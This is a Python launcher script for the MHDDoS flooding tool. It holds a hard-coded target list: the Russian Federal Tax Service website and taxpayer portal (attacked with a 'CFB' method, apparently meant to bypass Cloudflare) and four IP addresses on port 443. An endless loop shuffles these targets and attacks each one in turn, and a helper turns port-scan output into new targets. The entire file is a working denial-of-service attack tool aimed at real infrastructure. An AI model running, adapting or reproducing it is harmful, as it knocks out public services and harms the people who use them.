#!/usr/bin/env python3

import random

from utils import setup_logger, run_mhddos, Args


ARGS_LIST = list({
    Args.https("lkdr.nalog.gov.ru/", method="CFB"),
    Args.https("nalog.gov.ru/", method="CFB"),
    Args.tcp("213.24.64.138:443"),
    Args.tcp("213.24.64.104:443"),
    Args.tcp("81.176.235.2:443"),
    Args.tcp("213.24.64.94:443"),
})

zh = """
"""

if zh.strip():
    zh = filter(None, (l.strip() for l in zh.splitlines()))
    for l in zh:
        host, ports = l.strip().split(" ", 1)
        ports = ports[1: -1].split(", ")
        for port in ports:
            p, m = port.split("/")
            print(f'Args.{m}("{host}:{p}"),')
    exit(10)

if __name__ == "__main__":
    logger = setup_logger("ProxyLoop")
    logger.info("Number of targets: %d", len(ARGS_LIST))
    while True:
        random.shuffle(ARGS_LIST)
        for args in ARGS_LIST:
            run_mhddos(logger, args)
